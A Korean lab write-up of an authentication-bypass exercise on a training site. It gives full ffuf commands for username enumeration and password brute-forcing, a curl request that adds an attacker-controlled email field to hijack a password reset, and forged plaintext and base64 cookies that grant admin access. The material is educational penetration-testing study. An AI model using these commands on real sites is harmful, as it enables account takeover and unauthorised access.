1. 인증 우회

인증 우회란?

-    허용되지 않은 영역에 대한 액세스를 허용하기 위해 로그인 및 기타 인증 메커니즘을 무효화하는 방법을 학습하겠습니다.

사용자 이름 열거

인증 취약성을 찾으려고 할 때 완료할 수 있는 유용한 연습은 나중에 다른 작업에서 사용할 유효한 사용자 이름 목록을 만드는 것입니다.
실습에서 제공되는 사이트에서 사용자 id admin을 입력하고 가짜 정보로 다른 정보를 채우면 이 유저 네임을 가진 사용자가 존재한다는 오류가 표시됩니다. 이걸 이용하여 우리는 사용되는 사용자 이름 목록을 사용하여 일치 여부를 확인합니다.
이번 실습에서는 ffuf 라는 도구를 사용하여 이 과정을 간략하게 해보겠습니다. 사실 실습을 설명할 필요도 없어.

ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://아이피 주소/customers/signup -mr "username already exists"

를 터미널에 입력하면 금방 끝납니다.
위의 명령어의 인수를 설명하자면

설명

-w : 확인할 사용자 이름 목록이 포함된 자신의 컴퓨터의 파일 위치를 선택
-x: 요청 방법을 지정하며 기본적으로 GET 요청
-H: 요청에 추가 헤더를 추가하는데 사용
Content-Tyype: 양식 데이터를 보내는 것을 웹 서버로 설정하고 있습니다.
-u :요청을 보내는 url를 지정합니다.
-mr: 유효한 사용자 이름을 찾았는지 확인하기 위해 찾고 있는 페이지의 텍스트입니다.

윈도우나 리눅스에 설치하고 터미널을 이용하여 간단히 사용할 수 있습니다.

 브루트 포스

무차별 대입 공격은 단일 사용자 이름 또는 우리의 경우와 같이 사용자 이름 목록에 대해 일반적으로 사용되는 암호 목록을 시도하는 자동화된 프로세스입니다.
기존에 설치했던 ffuf을 사용하여 위와 같은 무차별 대입 공격을 진행할 수 있습니다.
실습은 페이지에서 제공하는 명령어를 그대로 입력하면 되네 서술하지 않겠습니다.

명령어 해석:

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://아이피 주소 /customers/login -fc 200

명령어의 인수

 W1이 경우 유효한 사용자 이름 목록과 W2시도할 비밀번호 목록을 선택했습니다 . 다중 단어 목록은 다시 -w인수로 지정되지만 쉼표로 구분됩니다. 긍정적인 일치를 위해 -fc인수를 사용하여 200이 아닌 HTTP 상태 코드를 확인합니다.

아, 그리고 이전 단계에서 확인 유저 정보 텍스트 파일을 미리 저장해두어야 가능한 명령어 입니다. 이를 기억해주세요.

 논리 결함

논리 결함이란 무엇입니까**?

인증 프로세스에 논리적 결함이 있는 경우가 있습니다. 논리적 결함은 애플리케이션의 일반적인 논리적 경로가 해커에 의해 우회, 우회 또는 조작되는 경우입니다

논리 결함 예

아래의 모의 코드 예제는 클라이언트가 방문하는 경로의 시작이 /admin으로 시작하는지 확인하고, 그렇다면 클라이언트가 실제로 관리자인지 추가로 확인합니다. 페이지가 /admin으로 시작하지 않으면 페이지가 클라이언트에 표시됩니다.

if( url.substr(0,6) === '/admin') {
# Code to check user is an admin
} else {
# View Page
}

위의 PHP 코드 예제는 3개의 등호(===)를 사용하기 때문에 동일한 대소문자를 포함하여 문자열에서 정확히 일치하는 항목을 찾습니다. 이 코드는 /admin**을** 요청하는 인증되지 않은 사용자가  자신의 권한을 확인하지 않고 페이지를 표시하여 인증 확인을 완전히 우회하기 때문에 논리 결함을 나타냅니다  .

논리 결함 실용

실습

실습을 진행해 보겠습니다. 실습에서 제공하는 웹 사이트에는 암호 재설정 기능이 존재합니다.

기능을 실험을 위해 제공된 이메일 주소를 입력하고 그 다음 유저의 이름을 입력하면

다음과 같은 화면이 뜹니다.

이 단계에서 이메일과 사용자 이름을 모두 알아야 하고 비밀번호 링크가 계정 소유자의 이메일 주소로 전송되기 때문에 이 애플리케이션의 취약점이 무엇인지 궁금할 수 있습니다.

재설정 이메일 프로세스의 두 번째 단계에서 사용자 이름은 POST 필드에서 웹 서버로 제출되고 이메일 주소는 쿼리 문자열 요청에서 GET 필드로 전송됩니다.

curl 도구를 사용하여 수동으로 웹 서버에 요청을 만들어 이를 설명하겠습니다.

curl 'http://ip 주소/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'

-H요청에 추가 헤더를 추가합니다. Content-Type이 경우 를 로 설정하여 application/x-www-form-urlencoded 웹 서버가 양식 데이터를 보내고 있음을 알 수 있으므로 요청을 올바르게 이해할 수 있을 겁니다.

애플리케이션에서 쿼리 문자열을 사용하여 사용자 계정을 검색하지만 나중에 애플리케이션 로직에서 PHP 변수에 있는 데이터를 사용하여 비밀번호 재설정 이메일을 보냅니다

PHP $_REQUEST변수는 쿼리 문자열에서 받은 데이터와 POST 데이터를 포함하는 배열입니다. 쿼리 문자열과 POST 데이터 모두에 동일한 키 이름이 사용되는 경우 이 변수에 대한 애플리케이션 논리는 쿼리 문자열보다 POST 데이터 필드를 선호하므로 POST 형식에 다른 매개변수를 추가하면 암호 재설정 위치를 제어할 수 있습니다. 이메일이 전송됩니다.

curl 'http://ip주소/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'

다음 단계에서는 Acme IT 지원 고객 섹션에서 계정을 만들어야 합니다. 이렇게 하면 지원 티켓을 만드는 데 사용할 수 있는 고유한 이메일 주소가 제공됩니다. 이메일 주소는 @customer.acmeitsupport.thm 형식입니다.

이제 Curl Request 2**를** 다시 실행하지만 이메일 필드에 @acmeitsupport.thm을 입력하면 Robert로 로그인할 수 있는 링크가 포함된 티켓이 계정에 생성됩니다. 

자 이제 그걸 통하여 로그인을 하면 저희는 문제를 풀 수 있습니다.

위에서 진행했던 명령어에 email 부분에 생성해두었던 이메일을 입력하고 실행하면 아까 만들었던 계정의 Support Tickets를 확인해버면 robert의 계정과 비밀번호를 재설정할 수 있는 링크가 나옵니다.

그 다음 그 링크로 들어간 뒤에 Support Tickets에서 정답을 확인할 수 있습니다.

이 방법이 가능한 이유는 사용자의 이름과 사용자가 사용하는 이메일 간의 검정이 없어서 그렇습니다.

즉 오류 결함이죠.

이와 같은 허점들을 파악하여 해킹을 하는 것도 하나의 재미라고 생각되네요.

쿠키 조작

온라인 세션 중에 웹 서버가 설정한 쿠키를 검사하고 편집하면 인증되지 않은 액세스, 다른 사용자의 계정에 대한 액세스 또는 상승된 권한과 같은 여러 가지 결과가 발생할 수 있습니다.

일반 텍스트

일부 쿠키의 내용은 일반 텍스트일 수 있으며 그 기능은 명백합니다. 예를 들어 성공적인 로그인 후 설정된 쿠키인 경우:

쿠키 설정**: logging_in=true;** 최대 연령**=3600;** 경로**=/**
쿠키 설정**: admin=false;** 최대 연령**=3600;** 경로**=/**

사용자가 현재 로그인했는지 여부를 제어하는 ​​것으로 보이는 하나의 쿠키(logged_in)와 방문자에게 관리자 권한이 있는지 여부를 제어하는 ​​다른 하나(admin)가 표시됩니다. 이 논리를 사용하여 쿠키의 내용을 변경하고 요청을 하면 권한을 변경할 수 있습니다.

curl -H "Cookie: logged_in=true; admin=false" http://ip 주소/cookie-test

curl -H "Cookie: logged_in=true; admin=true" http://ip 주소.104/cookie-test

이 명령어는 위와 ㄷ달리 결과를 반환합니다. 왜냐하면 두 쿠리를 모두 true로 설정하였기 때문입니다.

해싱

때때로 쿠키 값은 임의의 긴 문자열처럼 보일 수 있습니다. 이를 원본 텍스트의 비가역적 표현인 해시라고 합니다. 다음은 접할 수 있는 몇 가지 예입니다.
원본 문자열 해시 방식 산출
1 md5 c4ca4238a0b923820dcc509a6f75849b
1 sha-256 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
1 sha-512 4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a
1 Sha1 356a192b7913b04c54574d18c28d46e6395428ab

위의 표에서 동일한 입력 문자열의 해시 출력은 사용 중인 해시 방법에 따라 크게 다를 수 있음을 알 수 있습니다. 해시는 되돌릴 수 없지만 매번 동일한 출력이 생성되므로  https://crackstation.net/ 과 같은 서비스가  수십억 개의 해시 데이터베이스와 원래 문자열을 유지하는 데 도움이 됩니다.

부호화

인코딩은 임의의 텍스트 문자열처럼 보이지만 사실 인코딩은 되돌릴 수 있다는 점에서 해싱과 유사합니다. 그래서 질문을 던집니다. 인코딩의 요점은 무엇입니까? 인코딩을 사용하면 이진 데이터를 일반 텍스트 ASCII 문자만 지원하는 매체를 통해 쉽고 안전하게 전송할 수 있는 사람이 읽을 수 있는 텍스트로 변환할 수 있습니다.

일반적인 인코딩 유형은 이진 데이터를 문자 AZ 및 2-7로 변환하는 base32와 문자 az, AZ, 0-9,+, / 및 패딩용 등호를 사용하여 변환하는 base64입니다.

로그인 시 웹 서버에 의해 설정되는 아래 데이터를 예로 들어 보겠습니다.

쿠키 설정**: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==;** 최대 연령**=3600;** 경로**=/

**

base64로 디코딩된 이 문자열의 값은  {"id":1,"admin": false}  입니다. 그런 다음 이를 다시 base64로 인코딩하여 다시 인코딩할 수 있지만 대신 admin 값을 true로 설정하면 이제 관리자 액세스 권한이 부여됩니다.
